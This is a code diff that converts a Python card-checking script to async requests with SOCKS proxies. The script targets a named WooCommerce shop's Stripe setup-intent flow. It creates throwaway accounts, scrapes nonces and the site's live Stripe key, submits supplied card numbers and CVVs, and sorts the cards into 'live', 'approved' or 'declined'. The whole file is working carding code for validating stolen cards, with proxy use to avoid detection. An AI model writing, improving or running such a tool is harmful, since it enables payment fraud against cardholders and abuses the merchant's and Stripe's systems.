@@ -1,4 +1,5 @@
-import requests
+import aiohttp
+from aiohttp_socks import ProxyConnector
 import re
 import random
 import string
@@ -11,7 +12,7 @@ def _generate_email():
     rnd_digits = ''.join(random.choices(string.hexdigits.lower(), k=4))
     return f"{name}{rnd_digits}@{random.choice(domains)}"
 
-def _format_proxy(proxy: str | None) -> dict | None:
+def _format_proxy(proxy: str | None) -> str | None:
     if not proxy:
         return None
     p = str(proxy).strip()
@@ -37,9 +38,9 @@ def _format_proxy(proxy: str | None) -> dict | None:
     elif formatted.startswith("socks4://"):
         formatted = formatted.replace("socks4://", "socks4a://")
 
-    return {"http": formatted, "https": formatted}
+    return formatted
 
-def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: str | None = None) -> tuple[str, str, str]:
+async def check_card_nemaneide(cc: str, mm: str, yy: str, cvv: str, proxy_url: str | None = None) -> tuple[str, str, str]:
     """
     Stripe $0.00 Setup Intent Gate (shop.nemaneide.com).
     Returns: (status, message, brand)
@@ -54,55 +55,67 @@ def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: st
 
     rnd = lambda k: ''.join(random.choices(string.hexdigits.lower(), k=k))
     fn = lambda h, k: (m := re.search(rf'name="{k}"\s+value="([^"]+)"', h, re.I)) and m.group(1)
-    jn = lambda h, k: (m := re.search(rf'"{k}"\s*:\s*"([^"]+)"', h)) and m.group(1)
 
-    s = requests.Session()
-    s.headers['User-Agent'] = ua
+    proxy_formatted = _format_proxy(proxy_url)
 
-    proxies = _format_proxy(proxy_url)
-    if proxies:
-        s.proxies = proxies
+    headers_base = {
+        'User-Agent': ua,
+        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.9',
+    }
 
     try:
-        # Step 1: GET /my-account/
-        r = s.get(f"{base_url}/my-account/", timeout=25)
-        n = fn(r.text, 'woocommerce-register-nonce')
-        if not n:
-            return "error", "Failed to extract register nonce", "UNKNOWN"
+        if proxy_formatted:
+            connector = ProxyConnector.from_url(proxy_formatted, ssl=False)
+        else:
+            connector = aiohttp.TCPConnector(ssl=False)
 
-        # Step 2: Register user session
-        email = _generate_email()
-        password = rnd(12)
-        s.post(
-            f"{base_url}/my-account/",
-            headers={'content-type': 'application/x-www-form-urlencoded', 'origin': base_url, 'referer': f'{base_url}/my-account/'},
-            data={
+        timeout = aiohttp.ClientTimeout(total=25, connect=8)
+        async with aiohttp.ClientSession(connector=connector, headers=headers_base, timeout=timeout) as session:
+            # Step 1: GET /my-account/
+            async with session.get(f"{base_url}/my-account/") as r:
+                t1 = await r.text()
+                n = fn(t1, 'woocommerce-register-nonce')
+                if not n:
+                    return "error", "Failed to extract register nonce", "UNKNOWN"
+
+            # Step 2: Register user session
+            email = _generate_email()
+            password = rnd(12)
+            reg_headers = {
+                'content-type': 'application/x-www-form-urlencoded',
+                'origin': base_url,
+                'referer': f'{base_url}/my-account/'
+            }
+            reg_data = {
                 'email': email,
                 'password': password,
                 'woocommerce-register-nonce': n,
                 '_wp_http_referer': '/my-account/',
                 'register': 'Registracija'
-            },
-            timeout=25
-        )
+            }
+            async with session.post(f"{base_url}/my-account/", headers=reg_headers, data=reg_data) as r_reg:
+                await r_reg.read()
 
-        # Step 3: GET /my-account/add-payment-method/
-        r2 = s.get(f"{base_url}/my-account/add-payment-method/", headers={'referer': f'{base_url}/my-account/'}, timeout=25)
-        html2 = r2.text
+            # Step 3: GET /my-account/add-payment-method/
+            async with session.get(f"{base_url}/my-account/add-payment-method/", headers={'referer': f'{base_url}/my-account/'}) as r2:
+                html2 = await r2.text()
 
-        m_pk = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html2) or re.search(r'(pk_live_[a-zA-Z0-9]+)', html2)
-        pk_val = m_pk.group(1) if m_pk else pk
+            m_pk = re.search(r'"key"\s*:\s*"(pk_live_[^"]+)"', html2) or re.search(r'(pk_live_[a-zA-Z0-9]+)', html2)
+            pk_val = m_pk.group(1) if m_pk else pk
 
-        m_form_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html2)
-        form_nonce = m_form_nonce.group(1) if m_form_nonce else None
-        if not form_nonce:
-            return "error", "Failed to extract add payment method nonce", "UNKNOWN"
+            m_form_nonce = re.search(r'name="woocommerce-add-payment-method-nonce"\s+value="([^"]+)"', html2)
+            form_nonce = m_form_nonce.group(1) if m_form_nonce else None
+            if not form_nonce:
+                return "error", "Failed to extract add payment method nonce", "UNKNOWN"
 
-        # Step 4: Tokenize card via Stripe API
-        stripe_res = s.post(
-            'https://api.stripe.com/v1/payment_methods',
-            headers={'origin': 'https://js.stripe.com', 'referer': 'https://js.stripe.com/'},
-            data={
+            # Step 4: Tokenize card via Stripe API
+            stripe_headers = {
+                'origin': 'https://js.stripe.com',
+                'referer': 'https://js.stripe.com/',
+                'content-type': 'application/x-www-form-urlencoded'
+            }
+            stripe_data = {
                 'type': 'card',
                 'card[number]': cc,
                 'card[cvc]': cvv,
@@ -117,59 +130,54 @@ def check_card_nemaneide_sync(cc: str, mm: str, yy: str, cvv: str, proxy_url: st
                 'muid': rnd(32),
                 'sid': rnd(32),
                 'time_on_page': str(random.randint(5000, 15000))
-            },
-            timeout=25
-        ).json()
+            }
+            async with session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data) as r_stripe:
+                stripe_res = await r_stripe.json()
 
-        if 'error' in stripe_res:
-            err_msg = stripe_res['error'].get('message', 'Declined')
+            if 'error' in stripe_res:
+                err_msg = stripe_res['error'].get('message', 'Declined')
+                brand = stripe_res.get('card', {}).get('brand', 'UNKNOWN')
+                err_lower = err_msg.lower()
+                if "security code" in err_lower:
+                    return "live", err_msg, brand
+                return "declined", err_msg, brand
+
+            pm_id = stripe_res.get('id')
             brand = stripe_res.get('card', {}).get('brand', 'UNKNOWN')
-            err_lower = err_msg.lower()
-            if "security code" in err_lower:
-                return "live", err_msg, brand
-            return "declined", err_msg, brand
+            if not pm_id:
+                return "error", "Failed to tokenize card", brand
 
-        pm_id = stripe_res.get('id')
-        brand = stripe_res.get('card', {}).get('brand', 'UNKNOWN')
-        if not pm_id:
-            return "error", "Failed to tokenize card", brand
+            # Step 5: Confirm SetupIntent via WooCommerce form post
+            form_data = {
+                'payment_method': 'stripe',
+                'wc-stripe-payment-method': pm_id,
+                'wc-stripe-payment-type': 'card',
+                'woocommerce-add-payment-method-nonce': form_nonce,
+                '_wp_http_referer': '/my-account/add-payment-method/',
+                'woocommerce_add_payment_method': '1'
+            }
+            async with session.post(f"{base_url}/my-account/add-payment-method/", data=form_data) as r_form:
+                res_html = await r_form.text()
 
-        # Step 5: Confirm SetupIntent via WooCommerce form post
-        form_data = {
-            'payment_method': 'stripe',
-            'wc-stripe-payment-method': pm_id,
-            'wc-stripe-payment-type': 'card',
-            'woocommerce-add-payment-method-nonce': form_nonce,
-            '_wp_http_referer': '/my-account/add-payment-method/',
-            'woocommerce_add_payment_method': '1'
-        }
-        r_form = s.post(f"{base_url}/my-account/add-payment-method/", data=form_data, timeout=30)
-        res_html = r_form.text
+            if 'woocommerce-message' in res_html or 'Dodana nova kartica' in res_html:
+                return "approved", "Payment Method Added", brand
 
-        if 'woocommerce-message' in res_html or 'Dodana nova kartica' in res_html:
-            return "approved", "Payment Method Added", brand
+            if 'woocommerce-error' in res_html:
+                m_err = re.search(r'class="woocommerce-error"[^>]*>\s*<li>(.*?)</li>', res_html, re.DOTALL)
+                if m_err:
+                    msg = re.sub(r'<[^>]+>', '', m_err.group(1)).strip()
+                    low_msg = msg.lower()
+                    if "security code" in low_msg or "cvc" in low_msg:
+                        return "live", msg, brand
+                    if "insufficient" in low_msg:
+                        return "live", msg, brand
+                    return "declined", msg, brand
+                return "declined", "Card Was Declined", brand
 
-        if 'woocommerce-error' in res_html:
-            m_err = re.search(r'class="woocommerce-error"[^>]*>\s*<li>(.*?)</li>', res_html, re.DOTALL)
-            if m_err:
-                msg = re.sub(r'<[^>]+>', '', m_err.group(1)).strip()
-                low_msg = msg.lower()
-                if "security code" in low_msg or "cvc" in low_msg:
-                    return "live", msg, brand
-                if "insufficient" in low_msg:
-                    return "live", msg, brand
-                return "declined", msg, brand
             return "declined", "Card Was Declined", brand
 
-        return "declined", "Card Was Declined", brand
-
-    except requests.exceptions.RequestException as e:
-        err_str = str(e)
-        if "timeout" in err_str.lower() or "connection" in err_str.lower():
-            return "error", "Connection timed out (proxy / target error)", "UNKNOWN"
-        return "error", err_str[:80], "UNKNOWN"
+    except asyncio.TimeoutError:
+        return "error", "Connection timed out (proxy / target error)", "UNKNOWN"
     except Exception as e:
         return "error", str(e)[:80], "UNKNOWN"
 
-async def check_card_nemaneide(cc: str, mm: str, yy: str, cvv: str, proxy_url: str | None = None) -> tuple[str, str, str]:
-    return await asyncio.to_thread(check_card_nemaneide_sync, cc, mm, yy, cvv, proxy_url)
